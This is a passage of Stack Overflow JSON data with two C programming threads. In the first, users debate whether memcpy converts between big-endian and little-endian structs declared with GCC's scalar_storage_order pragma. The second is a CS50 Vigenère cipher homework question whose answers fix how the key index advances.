"post_id": 53929194, "comment_id": 94720988, "body": "@jamesdlin The trick is not made by memcpy() at all: that function only has to copy blindly and verbatim a sequence of bytes, it is meant to do that. The trick is that the compiler treats differently two structures, thanks to the #pragmas that choose an endianness. It is similar to copy 4 bytes with memcpy, from an uint32 to an int32: after the copy, the int32 can be negative, even if the uint32 was (of course) not. The same bit pattern is interpreted differently... and in this case, with the two structs, is the same: same bit patterns mean different things."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545893841, "post_id": 53929194, "comment_id": 94721170, "body": "No, sorry, that still makes no sense.  We accept that <code>memcpy</code> copies bytes blindly: it does a <i>byte-for-byte</i> copy from the source to the destination.  But you don&#39;t <i>want</i> a byte-for-byte copy; you want to reverse bytes for <i>each</i> <code>struct</code> member.  There is no way for <code>memcpy </code>to know how which bytes to reverse.  Yes,  <code>scalar_storage_order</code> controls how the <code>struct</code> members are stored in memory, but <i>only</i> when it knows that it&#39;s dealing with those <code>struct</code>s (which is why member-wise assignment works).  Once you&#39;ve converted to <code>void*</code> then it no longer knows anything."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545894605, "post_id": 53929194, "comment_id": 94721390, "body": "@jamesdlin I updated my post, hoping to be more clear. And I want to remind you that the OP tried to do memcpy(), and it worked (see comment above). If you were true, it shouldn&#39;t have worked, never. Instead it did. And I&#39;ve been also clear about member access, and I also made an example on int32 and uint32 - I think that the last example should be very clear, could you explain what is wrong in that example?"}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545894752, "post_id": 53929194, "comment_id": 94721456, "body": "Your analogy of <code>memcpy</code> with <code>uint32</code> and <code>int32</code> does not apply at all.  In that case, you <i>can</i> just blindly copy bytes.  In fact, you don&#39;t need to copy at all: you could just do: <code>*((int32*) &amp;some_uint32)</code> to &quot;reinterpret&quot; the existing bytes without changing any of them.  In contrast, an endianness conversion requires changing the data (reversing bytes); the whole point of <code>scalar_storage_order</code> is to change how the <code>struct</code> is stored in memory.  If you still think <code>memcpy</code> should work, then do you also think that <code>*(test_L*) &amp;big)</code> would work too?"}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545894774, "post_id": 53929194, "comment_id": 94721465, "body": "I&#39;ve already provided a hypothesis for why <code>memcpy</code> might <i>seem</i> to work.  That it seems to work with clang but not gcc supports my guess."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545895424, "post_id": 53929194, "comment_id": 94721668, "body": "@jamesdlin my point is that the same bit pattern is intepreted differently by the type of access: int32 vs uint32. particular meaning. Your example typecast works, if you dereference a single member, because you are telling the compiler to treat big endian data as it was little endian, and the compiler will happily do it, the same as your previous cast on int32/uint32. If you do not refer to a member, then no endianness has meaning, like no signness exists if you don&#39;t refer integers."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545895628, "post_id": 53929194, "comment_id": 94721732, "body": "Endianness conversion is not about interpreting bit patterns differently.  It&#39;s about reordering bytes.  If bytes are not reordered in memory, then <code>#pragma scalar_storage_order</code> isn&#39;t doing what it&#39;s supposed to.   I guess reasoning doesn&#39;t work, so here&#39;s evidence: <a href=\"https://godbolt.org/z/n8cSSj\" rel=\"nofollow noreferrer\">godbolt.org/z/n8cSSj</a> and <a href=\"https://godbolt.org/z/JF8J5g\" rel=\"nofollow noreferrer\">godbolt.org/z/JF8J5g</a> Notice how with gcc there&#39;s a call to <code>memcpy</code>, but clang instead inlined a bunch of member-wise copying itself?"}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545897828, "post_id": 53929194, "comment_id": 94722403, "body": "@b.bkb Please retry, if you want, but using <i>big</i> and <i>little</i>, not <i>default</i>."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545897926, "post_id": 53929194, "comment_id": 94722426, "body": "@jamesdlin you are demonstrating that memcpy() does nothing, and I agree. Try to assign a member, memcpy() to another struct, and print that member. And use big/little, not default. TY."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545900619, "post_id": 53929194, "comment_id": 94723278, "body": "1. Upon further investigation <code>clang -Wall</code> actually complains about not recognizing <code>scalar_storage_order</code>, and I find no documentation providing evidence that it is supported, so whatever claim that it worked with clang is highly suspect."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545900707, "post_id": 53929194, "comment_id": 94723320, "body": "2. Your example demonstrates that you&#39;ve completely misunderstood what is desired.  The fact that printing <code>big.a1</code> and <code>little.a1</code> prints <i>different</i> values means that the bytes were blindly copied and that no reversal was performed.  That is <i>not</i> what the OP is asking for.  The whole point of doing member-wise copying is to preserve the <i>value</i>s while transforming the representation in-memory."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545902643, "post_id": 53929194, "comment_id": 94724033, "body": "@jamesdlin may be you are true. It all depends on how the data is accessed after the transformation. But if clang does not transform, and the OP told it worked, then the mistery gets even more deep..."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545903531, "post_id": 53929194, "comment_id": 94724335, "body": "The OP clearly wants the equivalent of doing member-wise copies without having to manually enumerate all members.  Your approach does not do that.  I suspect that the OP might have initially <i>thought</i> that clang worked because clang doesn&#39;t warn by default and because the whole point is that the <i>values</i> should not visibly change; the only way to tell that they have different endianness would be to cast to <code>char*</code> and to inspect each byte."}, {"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545905555, "post_id": 53929194, "comment_id": 94725149, "body": "@linuxfan  I have changed default to endian-little. And the result has no difference with &#39;default&#39;  . As  I know , the default means the c default endianness  which is always endian-little."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545907086, "post_id": 53929194, "comment_id": 94725883, "body": "@b.bkb All boils down on how you get the data in, and how you put the data out. If you are not really interested in the single members, then memcpy() is not for you because, as James says, the memory layout is not changed."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "reply_to_user": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545930591, "post_id": 53929194, "comment_id": 94735486, "body": "@b.bkb Endianness is not tied to the language.  It&#39;s tied to the target hardware architecture.  Almost all modern processors (x64, x86, ARM) are little-endian. (ARM actually supports a big-endian mode, but in practice nobody uses it.)"}, {"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545965086, "post_id": 53929194, "comment_id": 94744697, "body": "Thanks for your support and help. When I find a better way , I will tell you all."}], "tags": [], "owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "is_accepted": false, "score": -1, "last_activity_date": 1545899980, "last_edit_date": 1545899980, "creation_date": 1545811352, "answer_id": 53929194, "question_id": 53927398, "link": "https://stackoverflow.com/questions/53927398/c-big-endian-struct-interconvert-with-little-endian-struct/53929194#53929194", "title": "C - Big-endian struct interconvert with little-endian struct", "body": "<p>An answer was posted which suggested to use memcpy for this problem, but that answer has been deleted. Actually that answer was right, if used correctly, and I want to explain why.</p>\n\n<p>The #pragma specified by the OP is central, as he notes out:</p>\n\n<blockquote>\n  <p>Note: the above code must run on gcc-7 or higher because of the #pragma scalar_storage_order</p>\n</blockquote>\n\n<p>The struct from the OP:</p>\n\n<pre><code>#pragma scalar_storage_order big-endian\ntypedef struct {   \n    int a1;    \n    short a2;    \n    char a3;    \n    int a4;    \n} test_B;\n</code></pre>\n\n<p>means that the instruction \"test_B.a2=256\" writes, in the two consecutive bytes belonging to the a2 member, respectively 1 and 0. This is big-endian. The similar instruction \"test_L.a2=256\" would instead strore the bytes 0 and 1 (little endian).</p>\n\n<p>The following memcpy:</p>\n\n<pre><code>memcpy(&amp;test_L, &amp;test_B, sizeof test_L)\n</code></pre>\n\n<p>would make the bytes for test_L.a2 equal to 1 and 0, because that is the ram content of test_B.a2. But now, reading test_L.a2 in little endian mode, those two bytes mean 1. We wrote 256 and read back 1. This is exactly the wanted conversion.</p>\n\n<p>To use correctly this mechanism, it is sufficient to write in one struct, memcpy() in the other, and read the other - member by member. What was big-endian becomes little-endian and viceversa. Of course, if the intention is to elaborate data and apply calculations on it, it is important to know what endianness has the data; if it matches the default mode, no transformation has to be done before the calculations, but the transformation has to be applied later. On the contrary, if the incoming data does not match the \"default endianness\" of the processor, it must be transformed first.</p>\n\n<hr>\n\n<p>EDIT\nAfter the comment of the OP, below, I investigated more. I took a look at this <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Structure-Layout-Pragmas.html\" rel=\"nofollow noreferrer\">https://gcc.gnu.org/onlinedocs/gcc/Structure-Layout-Pragmas.html</a></p>\n\n<p>Well, there are three #pragma available to choose the byte layout: <em>big-endian</em>, <em>little-endian</em>, and <strong>default</strong>. One of the first two is equal to the last: if the target machine is little-endian, default means little-endian; if it is big-endian, default means big-endian. This is more than logical.</p>\n\n<p>So, doing a memcpy() between big-endian and default does nothing on a big-endian machine; and also this is logical. Ok, better I stress more that memcpy() does absolutely nothing per se: it only moves data from a ram area treated in a certain manner to another area treated in another manner. The two different areas are treated differently only when a normal member access is done: here come to play the <strong>#pragma scalar_storage_order</strong>. And as I written before, it is important to know what endiannes have the data entering the program. If they come from TCP network, for example, we know that is big-endian; more in general, if it is taken from outside the \"program\" and respect a protocol, we should know what endianness has. </p>\n\n<p>To convert from an endianness to the other, one should use <strong>little</strong> and <strong>big</strong>, <em>NOT</em> default, because that <em>default</em> is surely equal to one of the former two.</p>\n\n<hr>\n\n<h2>Still another edit</h2>\n\n<p>Stimulated by comments, and by Jamesdlin who used an online compiler, I tried to do it too. At this url  <a href=\"http://tpcg.io/lLe5EW\" rel=\"nofollow noreferrer\">http://tpcg.io/lLe5EW</a> \nthere is the demonstration that assigning to a member of one struct, memcpy to another, and reading that, the endian conversion is done. That's all.</p>\n"}], "owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 671, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1545899980, "creation_date": 1545798288, "last_edit_date": 1545816483, "question_id": 53927398, "link": "https://stackoverflow.com/questions/53927398/c-big-endian-struct-interconvert-with-little-endian-struct", "title": "C - Big-endian struct interconvert with little-endian struct", "body": "<p>I have two structs which have the same data members. (one is a <em>big_endian</em> struct, the other is <em>little_endian</em> ) now I have to interconvert with them. But when I code, I found that there are lots of repeated codes with little change. How can I change these codes to be more elegant without <strong>repeated code</strong>? (repeated code means these code may be similar such as <code>mode == 1</code> and <code>mode == 2</code>, which only differ in assignment position. It doesn't look elegant but works.)</p>\n\n<p>here is my code:</p>\n\n<pre><code>#pragma scalar_storage_order big-endian\n\ntypedef struct {   \n    int a1;    \n    short a2;    \n    char a3;    \n    int a4;    \n} test_B;\n\n#pragma scalar_storage_order default\n\ntypedef struct {\n    int a1;    \n    short a2;    \n    char a3;    \n    int a4;    \n} test_L;\n\n\nvoid interconvert(test_L *little, test_B *big, int mode) {\n    // if mode == 1 , convert little to big    \n    // if mode == 2 , convert big to little    \n    // it may be difficult and redundant when the struct has lots of data member!    \n    if(mode == 1) {\n        big-&gt;a1 = little-&gt;a1;\n        big-&gt;a2 = little-&gt;a2;\n        big-&gt;a3 = little-&gt;a3;\n        big-&gt;a4 = little-&gt;a4;\n    }\n    else if(mode == 2) {\n        little-&gt;a1 = big-&gt;a1;\n        little-&gt;a2 = big-&gt;a2;\n        little-&gt;a3 = big-&gt;a3;\n        little-&gt;a4 = big-&gt;a4;\n    }\n    else return;\n}\n</code></pre>\n\n<hr>\n\n<p><sub>Note\uff1aThe above code must run on <strong>gcc-7 or higher</strong> \uff0cbecause of the <code>#pragma scalar_storage_order</code></sub></p>\n"}, {"tags": ["c", "cs50", "vigenere"], "comments": [{"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1545793337, "post_id": 53926819, "comment_id": 94695587, "body": "Have you tried stepping through the code in a debugger to see where it&#39;s going wrong?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545793781, "post_id": 53926819, "comment_id": 94695640, "body": "It&#39;s a good idea to report errors on the <code>stderr</code> (standard error) stream.  You can avoid calling <code>strlen()</code> on each iteration by replacing <code>for (int j = 0; j &lt; strlen(argv[i]); j++)</code> with <code>for (int j = 0; argv[i][j] != &#39;\\0&#39;; j++)</code> (and some people wouldn&#39;t write the <code>!= &#39;\\0&#39;</code> out in full like that).  Neither of these directly affect the correctness of the code, though.  You should use <code>&#39;a&#39;</code> and <code>&#39;A&#39;</code> instead of 97 and 65; that makes the code more readable and more easily comprehended."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545793896, "post_id": 53926819, "comment_id": 94695650, "body": "You need to separate &#39;position in string <code>r</code>&#39; from &#39;encrypted character number&#39;.  You need an extra variable that you only increment when the character is alphabetic."}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 0, "creation_date": 1545794002, "post_id": 53926819, "comment_id": 94695669, "body": "<i>Side note:</i> for your first <code>if</code> it does a <code>return</code>. So, you can eliminate the <code>else</code> on that and just outdent the code. That is, <code>if (whatever) return; else { do_stuff }</code> goes to <code>if (whatever) return; do_stuff</code>"}, {"owner": {"reputation": 17, "user_id": 10833395, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-I8owbGlzCSo/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcbC_-Wah0WJAWSOy-lxKAMcTG-cMQ/mo/photo.jpg?sz=128", "display_name": "Jacky Choi", "link": "https://stackoverflow.com/users/10833395/jacky-choi"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545795783, "post_id": 53926819, "comment_id": 94695872, "body": "@Jonathan Leffler Thank you for your comments. But I still can&#39;t figure it out how to increment only when it is alphabetic I can only think of a for loop to do so, but it is not applicable in defining the key and to use it in the printf.  Can you tell me how to tackle the problem?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545799088, "post_id": 53926819, "comment_id": 94696304, "body": "Welcome to Stack Overflow. Please note that the preferred way of saying &#39;thanks&#39; around here is by up-voting good questions and helpful answers (once you have enough reputation to do so), and by accepting the most helpful answer to any question you ask (which also gives you a small boost to your reputation). Please see the <a href=\"https://stackoverflow.com/tour\">About</a> page and also <a href=\"http://stackoverflow.com/help/how-to-ask\">How do I ask questions here?</a> and <a href=\"http://stackoverflow.com/help/someone-answers\">What do I do when someone answers my question?</a>"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1545800586, "post_id": 53926819, "comment_id": 94696515, "body": "Don&#39;t use magic numbers. The code of the letter <code>a</code> is spelled this way: <b><code>&#39;a&#39;</code></b>."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545807042, "post_id": 53926819, "comment_id": 94697992, "body": "Offtopic: Due to <code>argc != 2</code> in the <code>if</code> branch, you don&#39;t need the outer loop in the <code>else</code> one, it will be run one single time anyway."}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 10833395, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-I8owbGlzCSo/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcbC_-Wah0WJAWSOy-lxKAMcTG-cMQ/mo/photo.jpg?sz=128", "display_name": "Jacky Choi", "link": "https://stackoverflow.com/users/10833395/jacky-choi"}, "edited": false, "score": 0, "creation_date": 1545799828, "post_id": 53927261, "comment_id": 94696402, "body": "Thank you for your suggestions. I have figured it out now. Appreciate for your help!"}], "tags": [], "owner": {"reputation": 4475, "user_id": 5577076, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qG4gB.png?s=128&g=1", "display_name": "DinoCoderSaurus", "link": "https://stackoverflow.com/users/5577076/dinocodersaurus"}, "is_accepted": false, "score": 1, "last_activity_date": 1545796586, "creation_date": 1545796586, "answer_id": 53927261, "question_id": 53926819, "link": "https://stackoverflow.com/questions/53926819/about-cs50-pset2-vigenere/53927261#53927261", "title": "About CS50 pset2 vigenere", "body": "<p>The problem is with the calculation of j here <code>int j = r % strlen(argv[1]);</code>. The index of the key is not related to <code>r</code> (the index of the message). Program needs to iterate through the key based solely on (length of) the key. You need to increment it each time you \"use\" a key index, and \"wrap\" it so it doesn't go past the end. You might consider declaring <code>j</code> before the <code>r</code> loop; increment j whenever you use a key index (hint: <code>j++</code>); and \"wrap\" j with modulo operator (hint: <code>j % strlen(argv[1]</code>). I leave the actual code to you.  </p>\n"}, {"comments": [{"owner": {"reputation": 17, "user_id": 10833395, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-I8owbGlzCSo/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcbC_-Wah0WJAWSOy-lxKAMcTG-cMQ/mo/photo.jpg?sz=128", "display_name": "Jacky Choi", "link": "https://stackoverflow.com/users/10833395/jacky-choi"}, "edited": false, "score": 0, "creation_date": 1545798943, "post_id": 53927326, "comment_id": 94696272, "body": "Thank you so much!!!! Now I get it. I have been struggling the reason behind for couple of days, really appreciate your detailed explanations."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 1, "last_activity_date": 1545798956, "last_edit_date": 1545798956, "creation_date": 1545797298, "answer_id": 53927326, "question_id": 53926819, "link": "https://stackoverflow.com/questions/53926819/about-cs50-pset2-vigenere/53927326#53927326", "title": "About CS50 pset2 vigenere", "body": "<p>It's a lot easier to show than explain:</p>\n\n<pre><code>#include &lt;cs50.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char **argv)\n{\n    if (argc != 2)\n    {\n        fprintf(stderr, \"Usage: %s keyword\\n\", argv[0]);\n        return 1;\n    }\n\n    for (int i = 1; i &lt; argc; i++)\n    {\n        for (int j = 0; argv[i][j] != '\\0'; j++)\n        {\n            if (isalpha(argv[i][j]) == false)\n            {                \n                fprintf(stderr, \"%s: non-alphabetic character '%c' (%d) in key\\n\",\n                        argv[0], argv[i][j], argv[i][j]);\n                return 1;\n            }\n        }\n    }\n\n    string pt = get_string(\"plaintext:  \");\n\n    printf(\"ciphertext: \");\n    int k = 0;\n    int keylen = strlen(argv[1]);\n    for (int r = 0; pt[r] != '\\0'; r++)\n    {                           \n        if (isupper(pt[r]))\n        {\n            int j = k++ % keylen;\n            int key = tolower(argv[1][j]) - 'a';\n            printf(\"%c\", (pt[r] - 'A' + key) % 26 + 'A');\n        }\n        else if (islower(pt[r]))\n        {\n            int j = k++ % keylen;\n            int key = tolower(argv[1][j]) - 'a';\n            printf(\"%c\", (pt[r] - 'a' + key) % 26 + 'a');\n        }\n        else\n        {\n            printf(\"%c\", pt[r]);\n        }\n\n     }            \n     printf(\"\\n\");       \n     return 0;\n}\n</code></pre>\n\n<p>Example run:</p>\n\n<pre><code>$ ./vig89 baz\nplaintext:  Hello, World!\nciphertext: Iekmo, Vprke!\n$\n</code></pre>\n\n<p>As I noted in a comment, you need to separate 'position in string, <code>r</code>' from 'encrypted character number'. You need an extra variable that you only increment when the character is alphabetic.</p>\n\n<p>In the code above, <code>k</code> is the extra variable (<code>keylen</code> is another, but it simply records the length of the key rather than repeatedly calling <code>strlen()</code>).  The value in <code>k</code> is incremented when it is known that the character is a letter and not otherwise.</p>\n\n<p>I observe that it might be sensible to process <code>argv[1]</code> so that you don't have to do the <code>tolower()</code> conversion each time; you could do that while validating the keyword.</p>\n\n<p>I've also reported errors on standard error, and not used <code>strlen()</code> in the condition part of the loops.  While the cost is not prohibitive if you're dealing with 3-letter keys, if you start calculating the length of a string that's 20 KiB long on each iteration, you might start to spot the overhead (unless the compiler manages to optimize it away \u2014 it might, it might not).  I've also aligned the plain text and the cipher text in the I/O.</p>\n\n<p>There are quite a lot of other changes that could/should be made.  For example, the first <code>for (int i = 1; \u2026)</code> loop is not needed; you only have one argument so you only need the inner <code>for (int j = 0; \u2026)</code> loop.  It is also more idiomatic to use <code>if (!isalpha(argv[i][j]))</code> than to compare the result with <code>false</code>, especially since the <a href=\"https://port70.net/~nsz/c/c11/n1570.html#7.4.1p1\" rel=\"nofollow noreferrer\"><code>isalpha</code></a> macro is not guaranteed to return 0 or 1 (it returns zero or non-zero) \u2013 so changing <code>if (isalpha(argv[i][j]) == false)</code> to <code>if (isalpha(argv[i][j] != true)</code> would not be reliable.  I'd probably create a simple variable <code>char *key = argv[1];</code> (or <code>string key = argv[1];</code> in the context of CS50, though I'm not convinced that the CS50 <code>typedef char *string;</code> is a good idea) and use that in the program.</p>\n"}], "owner": {"reputation": 17, "user_id": 10833395, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-I8owbGlzCSo/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcbC_-Wah0WJAWSOy-lxKAMcTG-cMQ/mo/photo.jpg?sz=128", "display_name": "Jacky Choi", "link": "https://stackoverflow.com/users/10833395/jacky-choi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1084, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545798956, "creation_date": 1545790145, "last_edit_date": 1545793606, "question_id": 53926819, "link": "https://stackoverflow.com/questions/53926819/about-cs50-pset2-vigenere", "title": "About CS50 pset2 vigenere", "body": "<p>Why my code would not skip the space and it led to wrong encryption sequence?</p>\n\n<p>When I check with an example \"Hello, World!\", my code counted the space also and converted to \"Iekmo, Wnslc!\" instead of \"Iekmo, Vprke!\" using the key \"baz\"</p>\n\n<p>Can someone explain the logic behind? Many 